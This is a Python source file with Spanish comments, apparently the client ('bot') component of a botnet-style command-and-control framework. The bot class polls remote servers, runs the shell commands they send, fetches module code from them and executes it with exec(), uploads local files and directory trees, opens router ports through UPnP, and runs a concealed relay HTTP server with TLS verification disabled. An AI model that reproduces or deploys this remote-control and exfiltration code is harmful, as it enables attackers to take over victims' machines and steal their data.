# -*- coding: UTF-8 -*-

from requests.packages.urllib3 import disable_warnings
import requests
import os
import time
import shelve
import sys
import copy
import inspect
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from subprocess import Popen, PIPE, STDOUT
from yaml import dump, load
from tempfile import gettempdir
from hashlib import sha512
from secrets import token_urlsafe

# Utilidades

from utils.sys_utils import uniqdata
from utils.Ciphers import hibrid
from utils.Wrappers import wrap_secure
from utils.Ciphers import generate_uniqkey
from utils.Ciphers import simplycrypt
from utils.sys_utils import my_addr, my_public_addr
from utils.sys_utils import bytes_decode
from utils.Checks import check_url
from utils.Checks import check_headers
from utils.sys_utils import bytes_convert
from utils.Checks import key_check_in_dict
from utils.sys_utils import set_proxy

# Modulos

from modules.UI import rename_order
from modules.Ciphers import POO_RSA
from modules.Connections import convex
from modules.Connections import portforwardlib

# Configuración

from conf import global_conf

class CommunicationError(Exception):"""
Error comuncandose con el servidor!
"""

class InvalidCredentials(Exception):"""
Cuando las credenciales introducidas son invalidas!
"""

class InvalidPath(Exception):"""
Error en el path remoto del servicio
"""

disable_warnings()

BaseHTTPRequestHandler.sys_version = ''
BaseHTTPRequestHandler.server_version = ''

# HTTP SERVER

class HTTPServerHandler(BaseHTTPRequestHandler):

    def _send_header(self):

        self.send_header('Content-Type', 'text/html')
        self.end_headers()

    def _error404(self):

        self.send_response(404)
        self._send_header()

    def _error500(self):

        self.send_response(500)
        self._send_header()

    def _error403(self):

        self.send_response(403)
        self._send_header()

    def _error400(self):

        self.send_response(400)
        self._send_header()

    def _found200(self):
        
        self.send_response(200)
        self._send_header()

    def handle(self):

        try:

            self.close_connection = True

            self.handle_one_request()
            while not self.close_connection:
                self.handle_one_request()

        except:

            #DEBUG
            #raise

            self._error500()

    def do_GET(self):

        self.send_response(403)
        self._send_header()

    def _read_db(self, key):

        try:

            with shelve.open(self.db_path, flag='r') as _obj:

                _result = _obj[sha512(key.encode()).hexdigest()]
                wrap_secure.add(key, [], self.db_pass, self.db_path)

        except:

            self._error500()

        else:

            self._found200()
            self.wfile.write(_result)

    def _write_db(self, key, first_value):

        _save = []
        _db_data = wrap_secure.read(key, self.db_pass, self.db_path)

        _save.append(first_value)

        if not (_db_data == False):

            _save = _save+_db_data

        if (wrap_secure.add(key, _save, self.db_pass, self.db_path) == True):

            self._found200()

        else:

            self._error500()

    def do_POST(self):

        content_length = self.headers['Content-Length']
        content_length = int(content_length) if not (content_length == None) else 0

        if (content_length == 0):

            self._error400()
            return

        content = self.rfile.read(content_length)

        if (len(content) == 0):

            self._error400()
            return

        try:

            _request = simplycrypt.decrypt(self._passphrase, content)
        
        except:

            self._error400()
            return

        else:

            if (_request == None):

                self._error400()
                return

        if (isinstance(_request, str) == True):

            _request = _request.lower()

            if (_request == 'get_hash'):

                try:

                    with shelve.open(self.db_path, flag='r') as _obj:

                        _hash = _obj[sha512('hash'.encode()).hexdigest()]

                except:

                    self._error500()

                else:

                    self._found200()
                    self.wfile.write(_hash)

            else:

                self._error400()

            return

        elif (isinstance(_request, dict) == True):

            if (len(_request) == 8):

                for _ in ['command', 'chars', 'iterations', 'security_number', 'decrement_number', 'passphrase', 'id']:

                    if (_request.get(_) == None):

                        self._error400()
                        return

                if not (len(_request['command']) == 3):

                    self._error400()
                    return

        else:

            self._error400()
            return

        (username, passphrase, command) = _request['command']

        command = str(command).lower()

        _chars = str(_request['chars'])
        _iterations = _request['iterations']
        _security_number = _request['security_number']
        _decrement_number = _request['decrement_number']
        _passphrase = _request['passphrase']
        _bot_id = _request['id']
        _data = _request['data']

        _key = str(_bot_id)+str(_passphrase)+str(_chars)+str(_iterations)+str(_security_number)+str(_decrement_number)
        
        if (str(username) == self._username) and (str(passphrase) == self._passphrase):

            if (command == 'save'):

                self._write_db(_key, {'id':_bot_id, 'passphrase':_passphrase, 'chars':_chars, 'iterations':_iterations, 'security_number':_security_number, 'decrement_number':_decrement_number, 'data':_data, 'address':self.client_address})
                
            elif (command == 'recover'):

                self._read_db(_key)

            elif (command == 'result'):

                self._write_db('result_%s' % (_key), _data)

            elif (command == 'recover_result'):

                self._read_db('result_%s' % (_key))
                
            elif (command == 'add_secundary_server'):

                if (self._object.addserver(_data) == True):
                    self._found200()
                else:
                    self._error500()

            else:

                self._error404()

        else:

            self._error403()

    def log_error(self, *args):

        pass

    def log_message(self, *args):

        pass

class bot(object):

    def __init__(self, address, port=80, path='/', proto='https', db_pass=token_urlsafe(), db_path=token_urlsafe(), sleep=1):

        if not (path[0] == '/'):

            raise InvalidPath('Error en el path remoto!.')

        set_proxy.autoconf()

        #Manejador de claves RSA
        #################################
        self.rsa = POO_RSA.main()       # Manejador del Bot
        self.rsa_server = POO_RSA.main()# Manejador del Servidor
        #################################

        #Manejador de la base de datos local
        #################################################
        self.db_path = '%s/%s' % (gettempdir(), db_path)# La ruta de la base de datos
        self.db_pass = db_pass                          # La contraseña para desencriptar la base de datos
        #################################################

        self.directors = []
        ##################### ADDR  PUB_ADDR  DEFAULT_LPORT

        self.__address = str(address)
        self.__port = int(port)
        self.__proto = str(proto)
        self.__path = str(path)

        self.url = '%s://%s:%d%s' % (self.__proto, self.__address, self.__port, self.__path)

        sleep = int(sleep)
        self.sleep = sleep*-1 if ('-' in str(sleep)) else sleep

        self.heades = None

    def setServerCredentials(self, pub_key):

        self.rsa_server.import_PublicKey(pub_key)

        self.servers = [[self.url, pub_key]]

        #Si existe la base de datos y tiene introducida la clave 'addserver' se agregaran los servidores
        read_servers = wrap_secure.read('addserver', self.db_pass, self.db_path)

        if not (read_servers == False):

            _servers = []

            for _ in read_servers:

                _servers.append(_)

            self.servers = self.servers + _servers

    def setHeaders(self, headers):

        check_headers.check(headers)
        
        self.headers = headers

    def setCredentials(self, password, bot_id, private_key, chars=global_conf.hashing['chars'], iterations=global_conf.hashing['iterations'], security_number=global_conf.hashing['security_number'], decrement_number=global_conf.hashing['decrement_number']): 

        # Verificamos si la clave es correcta
        ########################################
        self.rsa.import_PrivateKey(private_key)#
        ########################################

        # Inicio de sesión
        ################################################
        self.passphrase = str(password)                #
        self.bot_id = str(bot_id)                      #
        self.chars = str(chars)                        #
        self.iterations = int(iterations)              #
        self.security_number = int(security_number)    #
        self.decrement_number = int(decrement_number)  #
        ################################################

    def getPeers(self):

        result = self.send(('getPeers', None))

        for url, data in result.items():

            if not (data[0] == False):

                self.directors = self.directors+data[1]

        return(result)

    @staticmethod
    def __get_my_addr(addr, pub_addr):

        if (pub_addr == True):

            _address = my_public_addr.addr()

        else:

            if (addr == None) or (addr == '0.0.0.0') or (addr == ''):

                _address = my_addr.addr()[1]

            else:

                _address = str(addr)

                if (my_public_addr._validate_ip(_address) == False):

                    _address = my_addr.addr()[1]

        return(_address)

    def showServerHash(self):

        return(wrap_secure.read('hash', self.db_pass, self.db_path))

    def directorServer(self, username, passphrase, addr=None, pub_addr=False, lport=16666):

        _address = self.__get_my_addr(addr, pub_addr)

        HTTPServerHandler._username = username
        HTTPServerHandler._passphrase = passphrase
        
        HTTPServerHandler.db_path = self.db_path
        HTTPServerHandler.db_pass = self.db_pass

        HTTPServerHandler._object = self
        
        httpd = ThreadingHTTPServer(('', lport), HTTPServerHandler)

        _hash = self.showServerHash()

        if (_hash == False):

            _hash = generate_uniqkey.generate()

            wrap_secure.add('hash', _hash, self.db_pass, self.db_path)

        self.directorResponse = self.send(('addPeer', {'url':'http://%s:%d' % (_address, lport), 'username':username, 'passphrase':passphrase, 'db_passwd':self.db_pass, 'hash':_hash}))

        try:

            httpd.serve_forever()

        except KeyboardInterrupt:

            raise

        finally:

            httpd.shutdown()

    def setDirector(self, address, port, username, passphrase, db_passwd, identifier, proto='http'):

        proto = str(proto).lower()

        if (proto != 'http') and (proto != 'https'):

            raise requests.exceptions.InvalidURL('URL inválida!')

        _url = '%s://%s:%d' % (proto, address, int(port))

        self.directors.append({'url':_url, 'username':username, 'passphrase':passphrase, 'db_passwd':db_passwd, 'hash':identifier}) 

    def sendDirector(self, data, command):

        self.directors = uniqdata.uniqdata(self.directors)

        raw_data = {}

        for _ in self.directors:

            (url, user, passwd, db_passwd) = _['url'], _['username'], _['passphrase'], _['db_passwd']
            _data = {'chars':self.chars, 'iterations':self.iterations, 'security_number':self.security_number, 'decrement_number':self.decrement_number, 'passphrase':self.passphrase, 'id':self.bot_id, 'data':data, 'command':(user, passwd, command)}

            try:

                _response = requests.post(url, data=simplycrypt.encrypt(passwd, _data), verify=False, timeout=global_conf.connector['timeout']).content
    
            except Exception as Except:

                _response = str(Except)

            else:

                if not (_response == b'') and not (_response == ''):

                    _response = simplycrypt.decrypt(db_passwd, _response)

            raw_data[url] = _response

            time.sleep(self.sleep)

        return(raw_data)

    def getDirectorResults(self):

        return(self.sendDirector(None, 'recover_result'))

    @staticmethod
    def upnp_portmapping(external_port=36666, internal_port=7070, route_ip=None, lanaddr=None, disable=False, proto='TCP', duration=0, description='-'):

        if (len(portforwardlib.discover()) == 0):

            return(False)

        if (portforwardlib.forwardPort(external_port, internal_port, route_ip, lanaddr, disable, proto, duration, description, False) == False):
            
            return(False)

        return(True)

    def ping(self):

        return(self.send(('ping', None)))

    def loadModule(self, name, function, params={}):

        name = str(name)
        function = str(function)

        if not (isinstance(params, dict)):

            raise TypeError('El tipo de dato de los parámetros no es correcto')

        result = self.send(('loadModule', name))

        for url, data in result.items():

            if not (data[0] == False):

                namespace = {}
                exceptionResult = None
                modules = copy.copy(sys.modules)

                try:

                    exec(data[1], modules, namespace)
                    exec(data[1], namespace, namespace)

                    moduleResult = namespace[function](**params)

                except Exception as Except:

                    exceptionResult = (Except.__class__.__name__, str(Except))
                    moduleResult = None

                if (inspect.isgenerator(moduleResult)):

                    for _ in moduleResult:

                        self.send(('resultModule', (name, _, function, exceptionResult)), [url])

                else:

                    self.send(('resultModule', (name, moduleResult, function, exceptionResult)), [url])

    def download(self, filename, outname, save=False):

        raw_data = {}
        result = self.send(('RECV-FILE', filename))

        for url, data in result.items():

            raw_data[url] = []

            if not (data[0] == False):

                _bak_outname = rename_order.rename(outname)

                if not (_bak_outname == False):

                    outname = _bak_outname

                _recv = data[1]

                try:

                    _recv = int(_recv)

                except ValueError:

                    pass

                if not (_recv == 0):

                    if (save == True):

                        with open(outname, 'wb') as file_object:

                            file_object.write(bytes_convert.convert(_recv))
                        
                        raw_data[url].append((True, filename, outname))

                    else:

                        raw_data[url].append((True, _recv))

                else:

                    raw_data[url].append((False, filename, outname))

            else:

                raw_data[url].append((False, filename, outname))

        return(raw_data)

    def upload(self, filename, recursive=False, recursive_limit=0):

        _limit = 1
        _result = []

        if (os.path.isfile(filename)):

            with open(filename, 'rb') as file_object:

                return([self.send(('SEND-FILE', (file_object.read(), filename)))])

        elif (os.path.isdir(filename)):

            if not (recursive == True):

                for _ in os.listdir(filename):

                    _file = '%s/%s' % (filename, _)

                    if (os.path.isfile(_file)):

                        with open(_file, 'rb') as file_object:

                            _result.append(self.send(('SEND-FILE', (file_object.read(), _))))

            else:

                for root, path, _file in os.walk(filename):

                    if (recursive_limit == _limit):

                        break

                    for filepath in _file:

                        _filename = os.path.join(root, filepath)

                        if (os.path.isfile(_filename) == True):

                            with open(_filename, 'rb') as file_object:

                                _result.append(self.send(('SEND-FILE', (file_object.read(), os.path.basename(_filename)))))

                        if (recursive_limit == _limit):

                            break

                        _limit += 1

            return(_result)

        else:

            return(False)

    def shell_exec(self):

        result = self.send(('SHELL-EXEC', None))
        raw_result = {}
        executed = {}

        for url, data in result.items():

            if not (data[0] == False):

                if (data[1][0] == True):

                    for _ in data[1][1]:

                        if not (_ in executed):

                            _result = []
                            _cmd = Popen(_, shell=True, stdout=PIPE, stderr=STDOUT, universal_newlines=True)

                            for _ in _cmd.stdout:

                                _result.append(_)

                            _cmd.kill()

                            _result = ''.join(_result).rstrip()

                            executed[_] = _result

                            raw_result[url] = self.send(('rcommand', _result))

                        else:

                            raw_result[url] = self.send(('rcommand', executed[data[1][1]]))

                else:

                    raw_result[url] = data[1]

            else:

                raw_result[url] = data[1]

        return(raw_result)

    def addserver(self, manual_server=None):

        if (manual_server == None):

            result = self.send(('addserver', None))
        
        else:

            result = {None:(True, [manual_server])}

        _servers = []

        for url, data in result.items():

            if not (data[0] == False):

                for _ in data[1]:

                    _[0] = str(_[0])
                    _[1] = str(_[1])

                    if (check_url.check(_[0], None, False) == False):

                        _servers.append([_[0], _[1]])

                    else:

                        return(False)

        if (len(_servers) > 0):

            self.servers = uniqdata.uniqdata(self.servers + _servers)

            return(wrap_secure.add('addserver', self.servers, self.db_pass, self.db_path))

    def getQueue(self):

        return(self.send(('getQueue', None)))

    def __sendData(self, data, server=None):

        result = {}

        if not (isinstance(server, list)):

            servers = self.servers

        else:

            servers = server

        for _ in servers:

            _send_data = {
                    'chars':self.chars,
                    'iterations':self.iterations,
                    'security_number':self.security_number,
                    'decrement_number':self.decrement_number,
                    'passphrase':self.passphrase,
                    'id':self.bot_id,
                    'data':data
                    }

            try: 

                _response = hibrid.decrypt(requests.post(_[0], data=hibrid.encrypt(_send_data, _[1]), headers=self.headers, verify=False, timeout=global_conf.connector['timeout']).content, self.rsa.export_PrivateKey())

            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout):

                try:

                    _response = (False, self.sendDirector(data, 'save'))

                except Exception as Except:

                    _response = (False, str(Except))

            except Exception as Except:

                _response = (False, str(Except))

            result[_[0]] = _response

            time.sleep(self.sleep)

        return(result)

    def send(self, string, server=None):

        if not (isinstance(string, tuple) == True):

            raise TypeError('El tipo de dato de los datos a enviar no son correctos.')

        return(self.__sendData(string, server=None))
